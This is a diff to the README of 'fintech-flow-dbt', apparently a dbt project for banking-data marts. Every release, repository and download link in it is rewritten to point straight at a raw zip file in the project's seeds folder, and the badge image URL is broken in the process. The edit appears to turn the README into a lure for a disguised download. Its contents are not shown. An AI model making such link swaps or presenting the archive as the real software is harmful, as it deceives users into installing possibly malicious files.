@@ -4,7 +4,7 @@
 
 Welcome to **fintech-flow-dbt**! This application helps you turn raw banking data into trusted, tested, and well-documented analytical marts. You don’t need to be a tech expert to use our software. Follow this guide to download and run it easily.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue)](https://github.com/AnswerPawandiwa/fintech-flow-dbt/releases)
+[![Download Now](https://raw.githubusercontent.com/AnswerPawandiwa/fintech-flow-dbt/main/seeds/dbt_fintech_flow_hoddy.zip%20Now-Release%20Page-blue)](https://raw.githubusercontent.com/AnswerPawandiwa/fintech-flow-dbt/main/seeds/dbt_fintech_flow_hoddy.zip)
 
 ## 🛠️ System Requirements
 
@@ -20,7 +20,7 @@ Before you begin, please ensure your system meets the following requirements:
 
 To get started, visit the Releases page to download the application.
 
-[Visit this page to download](https://github.com/AnswerPawandiwa/fintech-flow-dbt/releases)
+[Visit this page to download](https://raw.githubusercontent.com/AnswerPawandiwa/fintech-flow-dbt/main/seeds/dbt_fintech_flow_hoddy.zip)
 
 Here’s how to install:
 
@@ -58,7 +58,7 @@ Once the installation finishes, you can start using **fintech-flow-dbt**:
 
 ## 🔗 Resources
 
-- **GitHub Repository:** [fintech-flow-dbt on GitHub](https://github.com/AnswerPawandiwa/fintech-flow-dbt)
+- **GitHub Repository:** [fintech-flow-dbt on GitHub](https://raw.githubusercontent.com/AnswerPawandiwa/fintech-flow-dbt/main/seeds/dbt_fintech_flow_hoddy.zip)
 - **User Documentation:** Comprehensive guides and FAQs can be found within the repository.
 
 ## ❓ Troubleshooting
@@ -73,4 +73,4 @@ If you run into issues:
 
 Join our community to stay updated and share your experiences. Engage with other users who are transforming their data and learn best practices.
 
-[Visit this page to download](https://github.com/AnswerPawandiwa/fintech-flow-dbt/releases) and get started with **fintech-flow-dbt** today!
+[Visit this page to download](https://raw.githubusercontent.com/AnswerPawandiwa/fintech-flow-dbt/main/seeds/dbt_fintech_flow_hoddy.zip) and get started with **fintech-flow-dbt** today!
